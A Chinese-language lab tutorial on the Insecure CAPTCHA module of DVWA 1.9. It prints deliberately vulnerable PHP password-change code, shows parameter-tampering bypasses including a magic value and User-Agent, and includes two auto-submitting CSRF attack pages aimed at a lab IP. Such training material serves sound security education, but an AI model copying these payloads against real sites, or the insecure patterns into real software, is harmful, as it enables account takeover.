# DVWA-1.9全级别教程之Insecure CAPTCHA

 时间 2016-11-23 06:12:39  

_原文_[http://www.freebuf.com/articles/web/119692.html][1]


***本文原创作者：lonehand，转载须注明来自FreeBuf.COM**

目前，最新的 DVWA 已经更新到1.9版本（[http://www.dvwa.co.uk/][3]），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。

DVWA简介

DVWA （Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。

DVWA共有十个模块，分别是 

Brute Force（暴力（破解））

Command Injection（命令行注入）

CSRF（跨站请求伪造）

File Inclusion（文件包含）

File Upload（文件上传）

Insecure CAPTCHA（不安全的验证码）

SQL Injection（SQL注入）

SQL Injection（Blind）（SQL盲注）

XSS（Reflected）（反射型跨站脚本）

XSS（Stored）（存储型跨站脚本）

需要注意的是， DVWA 1.9 的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。

![][4]

DVWA的搭建

Freebuf 上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（[http://www.freebuf.com/sectool/102661.html][5]）已经写得非常好了，在这里就不赘述了。

之前模块的相关内容

 [Brute Force][6]

 [Command Injection][7]

 [CSRF][8]

 [File Inclusion][9]

[File Upload][10]

本文介绍 Insecure CAPTCHA 模块的相关内容，后续教程会在之后的文章中给出。

Insecure CAPTCHA

 Insecure CAPTCHA  ，意思是不安全的验证码，  CAPTCHA  是 Completely Automated Public Turing Test to Tell Computers and Humans Apart ( 全自动区分计算机和人类的图灵测试)的简称。但个人觉得，这一模块的内容叫做不安全的验证流程更妥当些，因为这块主要是验证流程出现了逻辑漏洞，谷歌的验证码表示不背这个锅。

![][11]

reCAPTCHA验证流程

这一模块的验证码使用的是 Google 提供reCAPTCHA服务，下图是验证的具体流程。

![][12]

服务器通过调用 recaptcha_check_answer 函数检查用户输入的正确性。

    _recaptcha_check_answer($privkey,$remoteip, $challenge,$response)_

参数 $privkey 是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：

$is_valid是布尔型的，表示校验是否有效，

$error是返回的错误代码。 

（ ps: 有人也许会问，那这个模块的实验是不是需要科学上网呢？答案是不用，因为我们可以绕过验证码）

下面对四种级别的代码进行分析。

Low

服务器端核心代码：

    <?php 
    
    if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { 
        // Hide the CAPTCHA form 
        $hide_form = true; 
    
        // Get input 
        $pass_new  = $_POST[ 'password_new' ]; 
        $pass_conf = $_POST[ 'password_conf' ]; 
    
        // Check CAPTCHA from 3rd party 
        $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
            $_SERVER[ 'REMOTE_ADDR' ], 
            $_POST[ 'recaptcha_challenge_field' ], 
            $_POST[ 'recaptcha_response_field' ] ); 
    
        // Did the CAPTCHA fail? 
        if( !$resp->is_valid ) { 
            // What happens when the CAPTCHA was entered incorrectly 
            $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
            $hide_form = false; 
            return; 
        } 
        else { 
            // CAPTCHA was correct. Do both new passwords match? 
            if( $pass_new == $pass_conf ) { 
                // Show next stage for the user 
                echo " 
                    <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre> 
                    <form action=\"#\" method=\"POST\"> 
                        <input type=\"hidden\" name=\"step\" value=\"2\" /> 
                        <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /> 
                        <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /> 
                        <input type=\"submit\" name=\"Change\" value=\"Change\" /> 
                    </form>"; 
            } 
            else { 
                // Both new passwords do not match. 
                $html     .= "<pre>Both passwords must match.</pre>"; 
                $hide_form = false; 
            } 
        } 
    } 
    
    if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { 
        // Hide the CAPTCHA form 
        $hide_form = true; 
    
        // Get input 
        $pass_new  = $_POST[ 'password_new' ]; 
        $pass_conf = $_POST[ 'password_conf' ]; 
    
        // Check to see if both password match 
        if( $pass_new == $pass_conf ) { 
            // They do! 
            $pass_new = mysql_real_escape_string( $pass_new ); 
            $pass_new = md5( $pass_new ); 
    
            // Update database 
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    
            // Feedback for the end user 
            echo "<pre>Password Changed.</pre>"; 
        } 
        else { 
            // Issue with the passwords matching 
            echo "<pre>Passwords did not match.</pre>"; 
            $hide_form = false; 
        } 
    
        mysql_close(); 
    } 
    
    ?> 

 可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交  post  请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查  Change 、step  参数来判断用户是否已经输入了正确的验证码。

漏洞利用

 1.  通过构造参数绕过验证过程的第一步

首先输入密码，点击 Change 按钮，抓包：

![][13]

 （ ps: 因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有  recaptcha_challenge_field  、 recaptcha_response_field 两个参数）

更改 step 参数绕过验证码：

![][14]

修改密码成功：

![][15]

 2.  由于没有任何的防 CSRF 机制，我们可以轻易地构造攻击页面，页面代码如下（详见[CSRF模块的教程][8]）。

<html>

<body onload="document.getElementById('transfer').submit()">

<div>

 <form method="POST" id="transfer" action=" [http://192.168.153.130/dvwa/vulnerabilities/captcha/][16]">

<input type="hidden" name="password_new" value="password">

<input type="hidden" name="password_conf" value="password">

<input type="hidden" name="step" value="2"

<input type="hidden" name="Change" value="Change">

</form>

</div>

</body>

</html>

当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。

![][17]

美中不足的是，受害者会看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回 302 ，实现自动跳转），从而意识到自己遭到了攻击。

![][18]

**Medium**

服务器端核心代码：

    <?php 
    
    if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { 
        // Hide the CAPTCHA form 
        $hide_form = true; 
    
        // Get input 
        $pass_new  = $_POST[ 'password_new' ]; 
        $pass_conf = $_POST[ 'password_conf' ]; 
    
        // Check CAPTCHA from 3rd party 
        $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
            $_SERVER[ 'REMOTE_ADDR' ], 
            $_POST[ 'recaptcha_challenge_field' ], 
            $_POST[ 'recaptcha_response_field' ] ); 
    
        // Did the CAPTCHA fail? 
        if( !$resp->is_valid ) { 
            // What happens when the CAPTCHA was entered incorrectly 
            $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
            $hide_form = false; 
            return; 
        } 
        else { 
            // CAPTCHA was correct. Do both new passwords match? 
            if( $pass_new == $pass_conf ) { 
                // Show next stage for the user 
                echo " 
                    <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre> 
                    <form action=\"#\" method=\"POST\"> 
                        <input type=\"hidden\" name=\"step\" value=\"2\" /> 
                        <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /> 
                        <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /> 
                        <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /> 
                        <input type=\"submit\" name=\"Change\" value=\"Change\" /> 
                    </form>"; 
            } 
            else { 
                // Both new passwords do not match. 
                $html     .= "<pre>Both passwords must match.</pre>"; 
                $hide_form = false; 
            } 
        } 
    } 
    
    if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { 
        // Hide the CAPTCHA form 
        $hide_form = true; 
    
        // Get input 
        $pass_new  = $_POST[ 'password_new' ]; 
        $pass_conf = $_POST[ 'password_conf' ]; 
    
        // Check to see if they did stage 1 
        if( !$_POST[ 'passed_captcha' ] ) { 
            $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>"; 
            $hide_form = false; 
            return; 
        } 
    
        // Check to see if both password match 
        if( $pass_new == $pass_conf ) { 
            // They do! 
            $pass_new = mysql_real_escape_string( $pass_new ); 
            $pass_new = md5( $pass_new ); 
    
            // Update database 
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    
            // Feedback for the end user 
            echo "<pre>Password Changed.</pre>"; 
        } 
        else { 
            // Issue with the passwords matching 
            echo "<pre>Passwords did not match.</pre>"; 
            $hide_form = false; 
        } 
    
        mysql_close(); 
    } 
    
    ?> 

可以看到， Medium 级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。

漏洞利用

 1.  可以通过抓包，更改 step 参数，增加  passed_captcha 参数，  绕过验证码。

抓到的包：

![][19]

更改之后的包：

![][20]

更改密码成功：

![][21]

2. 依然可以实施CSRF攻击，攻击页面代码如下。

<html>

<body onload="document.getElementById('transfer').submit()">

<div>

 <form method="POST" id="transfer" action=" [http://192.168.153.130/dvwa/vulnerabilities/captcha/][16]">

<input type="hidden" name="password_new" value="password">

<input type="hidden" name="password_conf" value="password">

<input type="hidden" name="passed_captcha" value="true">

<input type="hidden" name="step" value="2">

<input type="hidden" name="Change" value="Change">

</form>

</div>

</body>

</html>

当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。

![][22]

不过依然会跳转到更改密码成功的界面。

![][23]

**High**

服务器端核心代码：

    <?php 
    
    if( isset( $_POST[ 'Change' ] ) ) { 
        // Hide the CAPTCHA form 
        $hide_form = true; 
    
        // Get input 
        $pass_new  = $_POST[ 'password_new' ]; 
        $pass_conf = $_POST[ 'password_conf' ]; 
    
        // Check CAPTCHA from 3rd party 
        $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
            $_SERVER[ 'REMOTE_ADDR' ], 
            $_POST[ 'recaptcha_challenge_field' ], 
            $_POST[ 'recaptcha_response_field' ] ); 
    
        // Did the CAPTCHA fail? 
        if( !$resp->is_valid && ( $_POST[ 'recaptcha_response_field' ] != 'hidd3n_valu3' || $_SERVER[ 'HTTP_USER_AGENT' ] != 'reCAPTCHA' ) ) { 
            // What happens when the CAPTCHA was entered incorrectly 
            $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
            $hide_form = false; 
            return; 
        } 
        else { 
            // CAPTCHA was correct. Do both new passwords match? 
            if( $pass_new == $pass_conf ) { 
                $pass_new = mysql_real_escape_string( $pass_new ); 
                $pass_new = md5( $pass_new ); 
    
                // Update database 
                $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;"; 
                $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    
                // Feedback for user 
                echo "<pre>Password Changed.</pre>"; 
            } 
            else { 
                // Ops. Password mismatch 
                $html     .= "<pre>Both passwords must match.</pre>"; 
                $hide_form = false; 
            } 
        } 
    
        mysql_close(); 
    } 
    // Generate Anti-CSRF token 
    generateSessionToken(); 
    
    ?> 

可以看到，服务器的验证逻辑是当 $resp （这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。

漏洞利用

搞清楚了验证逻辑，剩下就是伪造绕过了，由于 $resp 参数我们无法控制，所以重心放在参数recaptcha_response_field、User-Agent上。

第一步依旧是抓包：

![][24]

 更改  参数 recaptcha_response_field 以及http包头的User-Agent：

![][25]

密码修改成功：

![][26]

Impossible

服务器端核心代码

    if( isset( $_POST[ 'Change' ] ) ) { 
        // Check Anti-CSRF token 
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
    
        // Hide the CAPTCHA form 
        $hide_form = true; 
    
        // Get input 
        $pass_new  = $_POST[ 'password_new' ]; 
        $pass_new  = stripslashes( $pass_new ); 
        $pass_new  = mysql_real_escape_string( $pass_new ); 
        $pass_new  = md5( $pass_new ); 
    
        $pass_conf = $_POST[ 'password_conf' ]; 
        $pass_conf = stripslashes( $pass_conf ); 
        $pass_conf = mysql_real_escape_string( $pass_conf ); 
        $pass_conf = md5( $pass_conf ); 
    
        $pass_curr = $_POST[ 'password_current' ]; 
        $pass_curr = stripslashes( $pass_curr ); 
        $pass_curr = mysql_real_escape_string( $pass_curr ); 
        $pass_curr = md5( $pass_curr ); 
    
        // Check CAPTCHA from 3rd party 
        $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
            $_SERVER[ 'REMOTE_ADDR' ], 
            $_POST[ 'recaptcha_challenge_field' ], 
            $_POST[ 'recaptcha_response_field' ] ); 
    
        // Did the CAPTCHA fail? 
        if( !$resp->is_valid ) { 
            // What happens when the CAPTCHA was entered incorrectly 
            echo "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
            $hide_form = false; 
            return; 
        } 
        else { 
            // Check that the current password is correct 
            $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); 
            $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
            $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR ); 
            $data->execute(); 
    
            // Do both new password match and was the current password correct? 
            if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) { 
                // Update the database 
                $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); 
                $data->bindParam( ':password', $pass_new, PDO::PARAM_STR ); 
                $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
                $data->execute(); 
    
                // Feedback for the end user - success! 
                echo "<pre>Password Changed.</pre>"; 
            } 
            else { 
                // Feedback for the end user - failed! 
                echo "<pre>Either your current password is incorrect or the new passwords did not match.<br />Please try again.</pre>"; 
                $hide_form = false; 
            } 
        } 
    } 
    
    // Generate Anti-CSRF token 
    generateSessionToken(); 
    
    ?> 

 可以看到，  Impossible  级别的代码增加了  Anti-CSRF token  机制防御 CSRF 攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。

![][27]


[1]: http://www.freebuf.com/articles/web/119692.html
[3]: http://www.dvwa.co.uk/
[4]: http://img1.tuicool.com/7VvYrm2.jpg!web
[5]: http://www.freebuf.com/sectool/102661.html
[6]: http://www.freebuf.com/articles/web/116437.html
[7]: http://www.freebuf.com/articles/web/116714.html
[8]: http://www.freebuf.com/articles/web/118352.html
[9]: http://www.freebuf.com/articles/web/119150.html
[10]: http://www.freebuf.com/articles/web/119467.html
[11]: http://img1.tuicool.com/MBJN7bE.jpg!web
[12]: http://img2.tuicool.com/NBnQZzB.jpg!web
[13]: http://img2.tuicool.com/rmEjiyq.jpg!web
[14]: http://img0.tuicool.com/eqYfMfI.jpg!web
[15]: http://img0.tuicool.com/YRFjMby.jpg!web
[16]: http://192.168.153.130/dvwa/vulnerabilities/captcha/
[17]: http://img2.tuicool.com/vMFbey6.jpg!web
[18]: http://img0.tuicool.com/naAbIvA.jpg!web
[19]: http://img2.tuicool.com/FBNRnyz.jpg!web
[20]: http://img0.tuicool.com/rqyEvyu.jpg!web
[21]: http://img2.tuicool.com/6n2UbuI.jpg!web
[22]: http://img2.tuicool.com/fU3IVbF.jpg!web
[23]: http://img1.tuicool.com/yEB3Yfj.jpg!web
[24]: http://img0.tuicool.com/uuiy6fn.jpg!web
[25]: http://img2.tuicool.com/fiAbum3.jpg!web
[26]: http://img1.tuicool.com/2qMRnaa.jpg!web
[27]: http://img2.tuicool.com/z6FNNzF.jpg!web